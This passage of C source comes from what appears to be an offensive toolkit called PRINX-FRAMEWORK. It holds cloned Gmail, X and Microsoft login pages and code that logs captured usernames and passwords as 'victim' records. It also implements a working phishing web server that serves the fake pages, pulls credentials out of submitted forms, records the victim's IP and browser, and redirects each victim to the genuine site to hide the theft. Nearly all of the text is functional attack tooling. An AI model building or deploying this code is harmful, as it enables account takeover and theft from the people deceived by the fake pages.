    ".container{width:100%;max-width:448px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;text-align:center;margin:20px}\n"
    ".google-logo{margin-bottom:16px}\n"
    ".google-logo svg{width:75px;height:24px}\n"
    "h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}\n"
    "h2{font-size:16px;font-weight:400;color:#202124;margin-bottom:32px}\n"
    ".input-group{text-align:left;margin-bottom:24px}\n"
    ".input-group label{font-size:14px;color:#5f6368;display:block;margin-bottom:4px}\n"
    ".input-group input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none;transition:border-color 0.2s,box-shadow 0.2s}\n"
    ".input-group input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.2)}\n"
    ".forgot-email{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;display:block;text-align:left;margin:8px 0 24px}\n"
    ".forgot-email:hover{background:rgba(26,115,232,0.04);border-radius:4px}\n"
    ".guest-mode{font-size:14px;color:#5f6368;text-align:left;margin-bottom:32px;line-height:1.5}\n"
    ".guest-mode a{color:#1a73e8;text-decoration:none;font-weight:500}\n"
    ".actions{display:flex;justify-content:space-between;align-items:center}\n"
    ".create-link{color:#1a73e8;font-weight:500;text-decoration:none;font-size:14px;padding:8px 12px;border-radius:4px;transition:background 0.2s}\n"
    ".create-link:hover{background:rgba(26,115,232,0.04)}\n"
    ".next-btn{background:#1a73e8;color:#fff;padding:10px 24px;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;transition:background 0.2s,box-shadow 0.2s}\n"
    ".next-btn:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,0.3)}\n"
    ".next-btn:active{background:#0d47a1}\n"
    ".footer-links{margin-top:32px;display:flex;justify-content:space-between;font-size:12px}\n"
    ".footer-links a{color:#5f6368;text-decoration:none}\n"
    ".footer-links a:hover{color:#202124}\n"
    "</style>\n"
    "</head>\n"
    "<body>\n"
    "<div class='container'>\n"
    "<div class='google-logo'>\n"
    "<svg width='75' height='24' viewBox='0 0 75 24'><path fill='#4285F4' d='M14.6,12l-0.3,0.3c-1.5,1.5-3.5,2.3-5.8,2.3c-4.5,0-8.1-3.7-8.1-8.3s3.6-8.3,8.1-8.3c2.3,0,4.3,0.8,5.8,2.3l0.3,0.3l1.5-1.5L16,0.3C14.1-0.9,11.7-0.5,9.3,1.1C5.8,3.1,3.3,7.2,3.3,12s2.5,8.9,5.9,10.9c2.5,1.6,5.5,1.8,8.3,0.5c1.8-0.8,3.3-2.2,4.3-4l0,0l0,0c0.9-1.8,1.3-3.8,1.1-5.8L23,13.6H14.6L14.6,12z'/></svg>\n"
    "</div>\n"
    "<h1>Sign in</h1>\n"
    "<h2>to continue to Gmail</h2>\n"
    "<form method='POST' action='/login'>\n"
    "<div class='input-group'>\n"
    "<label for='email'>Email or phone</label>\n"
    "<input type='email' id='email' name='email' required autocomplete='email'>\n"
    "</div>\n"
    "<a href='#' class='forgot-email'>Forgot email?</a>\n"
    "<div class='guest-mode'>\n"
    "Not your computer? Use Guest mode to sign in privately.\n"
    "<a href='#'>Learn more about using Guest mode</a>\n"
    "</div>\n"
    "<div class='actions'>\n"
    "<a href='#' class='create-link'>Create account</a>\n"
    "<button type='submit' class='next-btn'>Next</button>\n"
    "</div>\n"
    "</form>\n"
    "<div class='footer-links'>\n"
    "<a href='#'>English (United States)</a>\n"
    "<a href='#'>Help</a>\n"
    "<a href='#'>Privacy</a>\n"
    "<a href='#'>Terms</a>\n"
    "</div>\n"
    "</div>\n"
    "</body>\n"
    "</html>";

/* Template 04: Twitter/X - Ultra Detailed Clone */
const char *TEMPLATE_TWITTER = 
    "<!DOCTYPE html>\n"
    "<html lang='en'>\n"
    "<head>\n"
    "<meta charset='UTF-8'>\n"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
    "<meta name='description' content='X is a social networking service.'>\n"
    "<title>X. It's what's happening / X</title>\n"
    "<style>\n"
    "*{margin:0;padding:0;box-sizing:border-box}\n"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}\n"
    ".container{width:100%;max-width:600px;padding:20px}\n"
    ".login-box{background:#000;border-radius:16px;padding:20px;color:#e7e9ea}\n"
    ".x-logo{font-size:42px;text-align:center;margin-bottom:32px;color:#e7e9ea;font-weight:bold}\n"
    "h2{font-size:31px;font-weight:bold;margin-bottom:8px}\n"
    "p.subtitle{color:#71767b;font-size:15px;margin-bottom:32px}\n"
    ".input-group{margin-bottom:20px}\n"
    ".input-group label{display:block;color:#71767b;font-size:13px;margin-bottom:4px}\n"
    ".input-group input{width:100%;padding:16px;border:1px solid #333639;border-radius:4px;background:#000;color:#e7e9ea;font-size:17px;outline:none;transition:border-color 0.2s}\n"
    ".input-group input:focus{border-color:#1d9bf0}\n"
    ".login-btn{background:#fff;color:#000;font-weight:bold;padding:12px;border:none;border-radius:9999px;width:100%;cursor:pointer;font-size:15px;margin:24px 0;transition:background 0.2s}\n"
    ".login-btn:hover{background:#d7dbdc}\n"
    ".forgot-link{color:#1d9bf0;text-decoration:none;font-size:15px;display:block;text-align:center}\n"
    ".forgot-link:hover{text-decoration:underline}\n"
    ".signup-notice{color:#71767b;font-size:15px;text-align:center;margin-top:40px}\n"
    ".signup-notice a{color:#1d9bf0;text-decoration:none}\n"
    ".signup-notice a:hover{text-decoration:underline}\n"
    "</style>\n"
    "</head>\n"
    "<body>\n"
    "<div class='container'>\n"
    "<div class='login-box'>\n"
    "<div class='x-logo'>𝕏</div>\n"
    "<h2>Sign in to X</h2>\n"
    "<p class='subtitle'>Stay updated on what's happening</p>\n"
    "<form method='POST' action='/login'>\n"
    "<div class='input-group'>\n"
    "<label>Phone, email, or username</label>\n"
    "<input type='text' name='text' required>\n"
    "</div>\n"
    "<div class='input-group'>\n"
    "<label>Password</label>\n"
    "<input type='password' name='password' required>\n"
    "</div>\n"
    "<button type='submit' class='login-btn'>Sign in</button>\n"
    "</form>\n"
    "<a href='#' class='forgot-link'>Forgot password?</a>\n"
    "<p class='signup-notice'>Don't have an account? <a href='#'>Sign up</a></p>\n"
    "</div>\n"
    "</div>\n"
    "</body>\n"
    "</html>";

/* Template 05: Microsoft - Ultra Detailed Clone */
const char *TEMPLATE_MICROSOFT = 
    "<!DOCTYPE html>\n"
    "<html lang='en'>\n"
    "<head>\n"
    "<meta charset='UTF-8'>\n"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
    "<meta name='description' content='Sign in to your Microsoft account'>\n"
    "<title>Sign in to your Microsoft account</title>\n"
    "<style>\n"
    "*{margin:0;padding:0;box-sizing:border-box}\n"
    "body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}\n"
    ".container{background:#fff;padding:44px;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,0.2);margin:20px}\n"
    ".ms-logo{margin-bottom:16px}\n"
    ".ms-logo img{width:108px;height:24px}\n"
    "h2{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}\n"
    ".subtitle{font-size:15px;color:#616161;margin-bottom:24px}\n"
    ".input-group{margin-bottom:16px}\n"
    ".input-group input{width:100%;padding:6px 10px;margin:8px 0;border:1px solid #605e5c;border-radius:2px;font-size:15px;height:36px;outline:none;transition:border-color 0.2s}\n"
    ".input-group input:focus{border-color:#0067b8}\n"
    ".signup-note{font-size:13px;color:#616161;margin:16px 0}\n"
    ".signup-note a{color:#0067b8;text-decoration:none;font-weight:500}\n"
    ".signup-note a:hover{text-decoration:underline}\n"
    ".next-btn{background:#0067b8;color:#fff;padding:10px 24px;border:none;font-size:15px;cursor:pointer;float:right;transition:background 0.2s}\n"
    ".next-btn:hover{background:#005da6}\n"
    ".footer{clear:both;padding-top:20px;font-size:13px;color:#616161;text-align:center}\n"
    "</style>\n"
    "</head>\n"
    "<body>\n"
    "<div class='container'>\n"
    "<div class='ms-logo'>\n"
    "<img src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTA4IDI0Ij48cmVjdCB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9IiNmMjUwMjIiLz48cmVjdCB4PSIyNiIgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSIjN2ZiYTAwIi8+PHJlY3QgeD0iNTIiIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgZmlsbD0iIzAwYTRlZiIvPjxyZWN0IHg9Ijc4IiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9IiNmZmI5MDAiLz48L3N2Zz4=' alt='Microsoft'>\n"
    "</div>\n"
    "<h2>Sign in</h2>\n"
    "<p class='subtitle'>to continue to Microsoft</p>\n"
    "<form method='POST' action='/login'>\n"
    "<div class='input-group'>\n"
    "<input type='email' name='login' placeholder='Email, phone, or Skype' required>\n"
    "</div>\n"
    "<p class='signup-note'>No account? <a href='#'>Create one!</a></p>\n"
    "<p class='signup-note'><a href='#'>Sign in with Windows Hello or a security key</a></p>\n"
    "<button type='submit' class='next-btn'>Next</button>\n"
    "</form>\n"
    "<div class='footer'>\n"
    "<a href='#'>Terms of use</a> | <a href='#'>Privacy & cookies</a> | ...\n"
    "</div>\n"
    "</div>\n"
    "</body>\n"
    "</html>";

/* Templates 06-30 akan diinisialisasi dalam fungsi init_all_templates() */

/* ====================================================================================================
 * SECTION 7: UTILITY FUNCTION IMPLEMENTATIONS
 * ==================================================================================================== */

void clear_screen(void) {
    printf("%s", CLEAR);
    fflush(stdout);
}

void trim(char *str) {
    if (!str || !*str) return;
    char *end;
    while (isspace((unsigned char)*str)) str++;
    if (*str == 0) { str[0] = '\0'; return; }
    end = str + strlen(str) - 1;
    while (end > str && isspace((unsigned char)*end)) end--;
    *(end + 1) = '\0';
}

void print_banner(void) {
    clear_screen();
    printf(RED BOLD);
    printf("╔══════════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║                                                                                      ║\n");
    printf("║  ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗    ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗  ║\n");
    printf("║  ██╔══██╗██╔══██╗██║████╗  ██║╚██╗██╔╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝  ║\n");
    printf("║  ██████╔╝██████╔╝██║██╔██╗ ██║ ╚███╔╝     █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝█████╔╝   ║\n");
    printf("║  ██╔═══╝ ██╔══██╗██║██║╚██╗██║ ██╔██╗     ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██╔═██╗   ║\n");
    printf("║  ██║     ██║  ██║██║██║ ╚████║██╔╝ ██╗    ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗  ║\n");
    printf("║  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ║\n");
    printf("║                                                                                      ║\n");
    printf("╠══════════════════════════════════════════════════════════════════════════════════════╣\n");
    printf("║              PRINX-FRAMEWORK v%s - ULTIMATE MAXIMAL EDITION                     ║\n", VERSION);
    printf("║              FWEBFM • PRINXPHISH • WIFI PENETRATION                                  ║\n");
    printf("║              Build: %s %s                                              ║\n", BUILD_DATE, BUILD_TIME);
    printf("║              Author: %s                                       ║\n", AUTHOR);
    printf("╚══════════════════════════════════════════════════════════════════════════════════════╝\n");
    printf(NC "\n");
}

void print_success(const char *fmt, ...) {
    pthread_mutex_lock(&print_mutex);
    va_list args;
    printf(GREEN "[+] ");
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf(NC "\n");
    fflush(stdout);
    pthread_mutex_unlock(&print_mutex);
}

void print_error(const char *fmt, ...) {
    pthread_mutex_lock(&print_mutex);
    va_list args;
    printf(RED "[-] ");
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf(NC "\n");
    fflush(stdout);
    pthread_mutex_unlock(&print_mutex);
}

void print_info(const char *fmt, ...) {
    pthread_mutex_lock(&print_mutex);
    va_list args;
    printf(CYAN "[*] ");
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf(NC "\n");
    fflush(stdout);
    pthread_mutex_unlock(&print_mutex);
}

void print_warning(const char *fmt, ...) {
    pthread_mutex_lock(&print_mutex);
    va_list args;
    printf(YELLOW "[!] ");
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf(NC "\n");
    fflush(stdout);
    pthread_mutex_unlock(&print_mutex);
}

void print_debug(int level, const char *fmt, ...) {
    if (level > config.debug_level) return;
    pthread_mutex_lock(&print_mutex);
    va_list args;
    printf(DIM "[D%d] ", level);
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf(NC "\n");
    fflush(stdout);
    pthread_mutex_unlock(&print_mutex);
}

void print_header(const char *title) {
    printf("\n" BLUE BOLD "══════ %s ══════\n" NC, title);
}

void print_separator(void) {
    printf(DIM "────────────────────────────────────────────────────────────────────────────────\n" NC);
}

void wait_enter(void) {
    printf("\n" DIM "[Press ENTER to continue...]" NC);
    getchar();
}

void wait_seconds(int seconds) {
    for (int i = seconds; i > 0; i--) {
        printf("\r" DIM "Waiting %d seconds... " NC, i);
        fflush(stdout);
        sleep(1);
    }
    printf("\r" CLEAR_LINE);
}

void get_input(const char *prompt, char *buffer, int size) {
    printf(CYAN "[?] %s" NC, prompt);
    if (fgets(buffer, size, stdin)) {
        trim(buffer);
    }
}

void get_password(const char *prompt, char *buffer, int size) {
    printf(CYAN "[?] %s" NC, prompt);
    /* Disable echo */
    struct termios old, new;
    tcgetattr(STDIN_FILENO, &old);
    new = old;
    new.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &new);
    
    if (fgets(buffer, size, stdin)) {
        trim(buffer);
    }
    
    /* Restore echo */
    tcsetattr(STDIN_FILENO, TCSANOW, &old);
    printf("\n");
}

int confirm_action(const char *msg) {
    char input[10];
    printf(RED "[!] %s (y/N): " NC, msg);
    if (fgets(input, sizeof(input), stdin)) {
        trim(input);
        return (strcasecmp(input, "y") == 0 || strcasecmp(input, "yes") == 0);
    }
    return 0;
}

int run_cmd(const char *cmd) {
    printf(YELLOW "[EXEC] %s" NC "\n", cmd);
    fflush(stdout);
    return system(cmd);
}

int run_cmd_silent(const char *cmd) {
    char full_cmd[MAX_BUFFER];
    snprintf(full_cmd, sizeof(full_cmd), "%s 2>/dev/null 1>/dev/null", cmd);
    return system(full_cmd);
}

void create_dir(const char *path) {
    struct stat st;
    if (stat(path, &st) == -1) {
        mkdir(path, 0755);
    }
}

int file_exists(const char *path) {
    return access(path, F_OK) == 0;
}

char* get_timestamp(void) {
    static char ts[64];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
    return ts;
}

char* get_date(void) {
    static char d[32];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(d, sizeof(d), "%Y-%m-%d", t);
    return d;
}

char* get_time(void) {
    static char tm[32];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(tm, sizeof(tm), "%H:%M:%S", t);
    return tm;
}

void url_decode(char *str) {
    char *decoded = str;
    char temp[3] = {0};
    while (*str) {
        if (*str == '%' && isxdigit(*(str+1)) && isxdigit(*(str+2))) {
            temp[0] = *(str+1);
            temp[1] = *(str+2);
            *decoded++ = (char)strtol(temp, NULL, 16);
            str += 3;
        } else if (*str == '+') {
            *decoded++ = ' ';
            str++;
        } else {
            *decoded++ = *str++;
        }
    }
    *decoded = '\0';
}

char* extract_param(const char *body, const char *param) {
    static char value[1024];
    char pattern[256];
    snprintf(pattern, sizeof(pattern), "%s=", param);
    
    char *start = strstr(body, pattern);
    if (!start) {
        value[0] = '\0';
        return value;
    }
    start += strlen(pattern);
    
    char *end = strchr(start, '&');
    if (!end) end = (char*)(start + strlen(start));
    
    size_t len = end - start;
    if (len >= sizeof(value)) len = sizeof(value) - 1;
    strncpy(value, start, len);
    value[len] = '\0';
    
    url_decode(value);
    return value;
}

void* safe_malloc(size_t size) {
    void *ptr = malloc(size);
    if (!ptr) {
        print_error("Memory allocation failed for %zu bytes", size);
        exit(EXIT_MEMORY);
    }
    memset(ptr, 0, size);
    return ptr;
}

void* safe_calloc(size_t count, size_t size) {
    void *ptr = calloc(count, size);
    if (!ptr) {
        print_error("Memory allocation failed for %zu x %zu bytes", count, size);
        exit(EXIT_MEMORY);
    }
    return ptr;
}

void* safe_realloc(void *ptr, size_t size) {
    void *new_ptr = realloc(ptr, size);
    if (!new_ptr) {
        print_error("Memory reallocation failed for %zu bytes", size);
        exit(EXIT_MEMORY);
    }
    return new_ptr;
}

void init_config(void) {
    memset(&config, 0, sizeof(Config));
    strcpy(config.output_dir, OUTPUT_DIR);
    strcpy(config.report_dir, REPORT_DIR);
    strcpy(config.lhost, "127.0.0.1");
    strcpy(config.lport, "4444");
    strcpy(config.interface, "wlan0");
    strcpy(config.wordlist, "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt");
    config.threads = 50;
    config.depth = 3;
    config.port = PORT_DEFAULT;
    config.max_pages = MAX_PAGES;
    config.max_endpoints = MAX_ENDPOINTS;
    config.follow_redirects = 1;
    config.respect_robots = 1;
    config.timeout = TIMEOUT_DEFAULT;
    config.retry_count = 3;
    config.debug_level = DEBUG_INFO;
    config.verbose = 1;
    config.generate_report = 1;
    config.export_json = 1;
    config.export_csv = 1;
    config.request_delay = 0.1;
    config.jitter = 0.05;
}

void sigint_handler(int sig) {
    (void)sig;
    printf("\n\n" YELLOW "[!] Interrupt signal received. Shutting down..." NC "\n");
    if (server_running) {
        server_running = 0;
        printf(CYAN "[*] Stopping phishing server..." NC "\n");
    }
    printf(GREEN "[+] Framework terminated safely." NC "\n");
    exit(EXIT_INTERRUPT);
}

void sigterm_handler(int sig) {
    (void)sig;
    printf("\n" YELLOW "[!] Termination signal received." NC "\n");
    exit(EXIT_SUCCESS);
}

void sigsegv_handler(int sig) {
    (void)sig;
    printf("\n" RED "[-] Segmentation fault detected!" NC "\n");
    printf(RED "[-] Please report this bug." NC "\n");
    exit(EXIT_FAILURE);
}

void setup_signal_handlers(void) {
    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigterm_handler);
    signal(SIGSEGV, sigsegv_handler);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
}

/* ====================================================================================================
 * SECTION 8: CREDENTIAL LOGGING FUNCTIONS
 * ==================================================================================================== */

void add_credential(const char *ip, const char *username, const char *password, const char *page) {
    pthread_mutex_lock(&log_mutex);
    
    if (total_creds >= log_capacity) {
        log_capacity *= 2;
        VictimLog *new_logs = realloc(creds_log, sizeof(VictimLog) * log_capacity);
        if (!new_logs) {
            pthread_mutex_unlock(&log_mutex);
            print_error("Memory allocation failed for credential logs");
            return;
        }
        creds_log = new_logs;
        memset(&creds_log[total_creds], 0, sizeof(VictimLog) * (log_capacity - total_creds));
    }
    
    VictimLog *log = &creds_log[total_creds];
    strncpy(log->ip, ip, 63);
    strncpy(log->timestamp, get_timestamp(), 63);
    strncpy(log->username, username, 255);
    strncpy(log->password, password, 255);
    strncpy(log->page, page, 127);
    strncpy(log->user_agent, "Captured via PRINXPHISH", 511);
    strncpy(log->country, "Unknown", 63);
    strncpy(log->city, "Unknown", 63);
    log->request_id = total_requests;
    log->capture_time = time(NULL);
    
    total_creds++;
    
    /* Real-time display */
    printf(GREEN "\n[+] CREDENTIALS CAPTURED! #%d" NC "\n", total_creds);
    printf(BOLD "  ├─ Page:     %s" NC "\n", log->page);
    printf("  ├─ IP:       %s\n", log->ip);
    printf("  ├─ Username: " GREEN "%s" NC "\n", log->username);
    printf("  ├─ Password: " RED "%s" NC "\n", log->password);
    printf("  └─ Time:     %s\n", log->timestamp);
    print_separator();
    
    pthread_mutex_unlock(&log_mutex);
}

void add_credential_full(const char *ip, const char *username, const char *password,
                         const char *email, const char *phone, const char *page, const char *user_agent) {
    pthread_mutex_lock(&log_mutex);
    
    if (total_creds >= log_capacity) {
        log_capacity *= 2;
        creds_log = safe_realloc(creds_log, sizeof(VictimLog) * log_capacity);
    }
    
    VictimLog *log = &creds_log[total_creds];
    strncpy(log->ip, ip, 63);
    strncpy(log->timestamp, get_timestamp(), 63);
    strncpy(log->username, username ? username : "", 255);
    strncpy(log->password, password ? password : "", 255);
    strncpy(log->email, email ? email : "", 255);
    strncpy(log->phone, phone ? phone : "", 31);
    strncpy(log->page, page ? page : "", 127);
    strncpy(log->user_agent, user_agent ? user_agent : "Unknown", 511);
    log->request_id = total_requests;
    log->capture_time = time(NULL);
    
    total_creds++;
    printf(GREEN "\n[+] DETAILED CREDENTIALS CAPTURED! #%d" NC "\n", total_creds);
    
    pthread_mutex_unlock(&log_mutex);
}

void list_credentials(int limit) {
    pthread_mutex_lock(&log_mutex);
    
    if (total_creds == 0) {
        printf(CYAN "[*] No credentials captured yet.\n" NC);
        pthread_mutex_unlock(&log_mutex);
        return;
    }
    
    int show = (limit > 0 && limit < total_creds) ? limit : total_creds;
    
    print_header("CAPTURED CREDENTIALS");
    printf("  %-4s %-20s %-16s %-25s %-25s %-15s\n", 
           "No", "Timestamp", "IP", "Username", "Password", "Page");
    print_separator();
    
    for (int i = 0; i < show; i++) {
        printf("  %-4d %-20s %-16s %-25s %-25s %-15s\n",
               i + 1, creds_log[i].timestamp, creds_log[i].ip,
               creds_log[i].username, creds_log[i].password, creds_log[i].page);
    }
    
    if (total_creds > show) {
        printf("  ... and %d more credentials\n", total_creds - show);
    }
    
    pthread_mutex_unlock(&log_mutex);
}

void export_credentials_json(const char *path) {
    FILE *fp = fopen(path, "w");
    if (!fp) {
        print_error("Cannot create JSON file: %s", path);
        return;
    }
    
    fprintf(fp, "{\n");
    fprintf(fp, "  \"framework\": \"PRINX-FRAMEWORK v%s\",\n", VERSION);
    fprintf(fp, "  \"generated\": \"%s\",\n", get_timestamp());
    fprintf(fp, "  \"total_credentials\": %d,\n", total_creds);
    fprintf(fp, "  \"credentials\": [\n");
    
    for (int i = 0; i < total_creds; i++) {
        fprintf(fp, "    {\n");
        fprintf(fp, "      \"id\": %d,\n", i + 1);
        fprintf(fp, "      \"timestamp\": \"%s\",\n", creds_log[i].timestamp);
        fprintf(fp, "      \"ip\": \"%s\",\n", creds_log[i].ip);
        fprintf(fp, "      \"username\": \"%s\",\n", creds_log[i].username);
        fprintf(fp, "      \"password\": \"%s\",\n", creds_log[i].password);
        fprintf(fp, "      \"page\": \"%s\",\n", creds_log[i].page);
        fprintf(fp, "      \"user_agent\": \"%s\"\n", creds_log[i].user_agent);
        fprintf(fp, "    }%s\n", (i < total_creds - 1) ? "," : "");
    }
    
    fprintf(fp, "  ]\n");
    fprintf(fp, "}\n");
    fclose(fp);
    print_success("Credentials exported to JSON: %s", path);
}

/* ====================================================================================================
 * SECTION 9: PHISHING SERVER FUNCTIONS
 * ==================================================================================================== */

void* phish_handle_connection(void *arg) {
    ServerArg *srv_arg = (ServerArg*)arg;
    int client_fd = srv_arg->socket_fd;
    int template_idx = srv_arg->template_idx;
    char client_ip[64];
    strncpy(client_ip, srv_arg->client_ip, 63);
    
    free(srv_arg);
    
    char buffer[MAX_BUFFER];
    memset(buffer, 0, sizeof(buffer));
    
    /* Set socket timeout */
    struct timeval tv;
    tv.tv_sec = TIMEOUT_DEFAULT;
    tv.tv_usec = 0;
    setsockopt(client_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    ssize_t bytes_read = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_read <= 0) {
        close(client_fd);
        return NULL;
    }
    buffer[bytes_read] = '\0';
    
    /* Parse HTTP request */
    char method[16] = {0};
    char path[MAX_URL] = {0};
    char version[16] = {0};
    sscanf(buffer, "%15s %8191s %15s", method, path, version);
    
    pthread_mutex_lock(&stats_mutex);
    total_requests++;
    int req_id = total_requests;
    pthread_mutex_unlock(&stats_mutex);
    
    /* Handle POST to /login - Capture credentials */
    if (strcmp(method, "POST") == 0 && strstr(path, "/login")) {
        char *body = strstr(buffer, "\r\n\r\n");
        if (body) {
            body += 4;
            
            char *username = NULL;
            char *password = NULL;
            char *email = NULL;
            char *phone = NULL;
            
            /* Extract using template-specific fields */
            if (template_idx >= 0 && template_idx < template_count) {
                username = extract_param(body, templates[template_idx].username_field);
                password = extract_param(body, templates[template_idx].password_field);
                if (strlen(templates[template_idx].email_field) > 0)
                    email = extract_param(body, templates[template_idx].email_field);
                if (strlen(templates[template_idx].phone_field) > 0)
                    phone = extract_param(body, templates[template_idx].phone_field);
            }
            
            /* Fallback extractions */
            if (!username || !strlen(username)) username = extract_param(body, "username");
            if (!username || !strlen(username)) username = extract_param(body, "email");
            if (!username || !strlen(username)) username = extract_param(body, "login");
            if (!username || !strlen(username)) username = extract_param(body, "text");
            if (!username || !strlen(username)) username = extract_param(body, "phone");
            if (!username || !strlen(username)) username = extract_param(body, "user");
            
            if (!password || !strlen(password)) password = extract_param(body, "password");
            if (!password || !strlen(password)) password = extract_param(body, "pass");
            if (!password || !strlen(password)) password = extract_param(body, "passwd");
            if (!password || !strlen(password)) password = extract_param(body, "pwd");
            if (!password || !strlen(password)) password = extract_param(body, "secret");
            
            if (!email || !strlen(email)) email = extract_param(body, "email");
            if (!phone || !strlen(phone)) phone = extract_param(body, "phone");
            
            /* Extract User-Agent */
            char *ua_start = strstr(buffer, "User-Agent: ");
            char user_agent[512] = "Unknown";
            if (ua_start) {
                ua_start += 12;
                char *ua_end = strstr(ua_start, "\r\n");
                if (ua_end) {
                    size_t ua_len = ua_end - ua_start;
                    if (ua_len < sizeof(user_agent)) {
                        strncpy(user_agent, ua_start, ua_len);
                        user_agent[ua_len] = '\0';
                        trim(user_agent);
                    }
                }
            }
            
            if ((username && strlen(username) > 0) || (password && strlen(password) > 0)) {
                add_credential_full(client_ip, username, password, email, phone,
                                   template_idx >= 0 ? templates[template_idx].name : "unknown",
                                   user_agent);
            }
        }
        
        /* Send redirect to real site */
        const char *redirect = "https://www.google.com";
        if (template_idx >= 0 && template_idx < template_count) {
            redirect = templates[template_idx].redirect_url;
        }
        
        char response[MAX_BUFFER];
        snprintf(response, sizeof(response),
                 "HTTP/1.1 %d Found\r\n"
                 "Location: %s\r\n"
                 "Set-Cookie: prinx_session=%d; Path=/; HttpOnly; SameSite=Lax\r\n"
                 "Content-Type: text/html\r\n"
                 "Content-Length: 0\r\n"
                 "Connection: close\r\n"
                 "\r\n",
                 HTTP_FOUND, redirect, req_id);
        send(client_fd, response, strlen(response), 0);
    } 
    /* Handle GET - Serve phishing page */
    else {
        const char *html = TEMPLATE_FACEBOOK; /* Default */
        if (template_idx >= 0 && template_idx < template_count) {
            html = templates[template_idx].html;
        }
        
        size_t html_len = strlen(html);
        
        char response[MAX_BUFFER + MAX_HTML];
        snprintf(response, sizeof(response),
                 "HTTP/1.1 %d OK\r\n"
                 "Content-Type: %s\r\n"
                 "Content-Length: %zu\r\n"
                 "Server: nginx/1.24.0\r\n"
                 "Cache-Control: no-store, no-cache, must-revalidate\r\n"
                 "Pragma: no-cache\r\n"
                 "X-Frame-Options: DENY\r\n"
                 "X-Content-Type-Options: nosniff\r\n"
                 "Connection: close\r\n"
                 "\r\n"
                 "%s",
                 HTTP_OK, CONTENT_HTML, html_len, html);
        send(client_fd, response, strlen(response), 0);
    }
    
    close(client_fd);
    return NULL;
}

void start_phish_server(int template_idx) {
    if (server_running) {
        print_warning("Server is already running!");
        return;
    }
    
    int port = config.port;
    char port_str[16];
    printf(CYAN "[?] Port [%d]: " NC, port);
    if (fgets(port_str, sizeof(port_str), stdin)) {
        trim(port_str);
        if (strlen(port_str) > 0) {
            int p = atoi(port_str);
            if (p >= PORT_MIN && p <= PORT_MAX) {
                port = p;
            }
        }
    }
    
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        print_error("Socket creation failed: %s", strerror(errno));
        return;
    }
    
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        print_error("Setsockopt failed: %s", strerror(errno));
        close(server_fd);
        return;
    }
    
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);
    
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        print_error("Bind failed on port %d: %s", port, strerror(errno));
        close(server_fd);
        return;
    }
    
    if (listen(server_fd, BACKLOG) < 0) {
        print_error("Listen failed: %s", strerror(errno));
        close(server_fd);
        return;
    }
    
    server_running = 1;
    server_start_time = time(NULL);
    
    print_success("════════════════════════════════════════════════");
    print_success("  PRINXPHISH SERVER STARTED");
    print_info("  Template: %s", templates[template_idx].name);
    print_info("  URL: http://0.0.0.0:%d", port);
    print_info("  Redirect: %s", templates[template_idx].redirect_url);
    print_warning("  Press 'q' + ENTER to stop server");
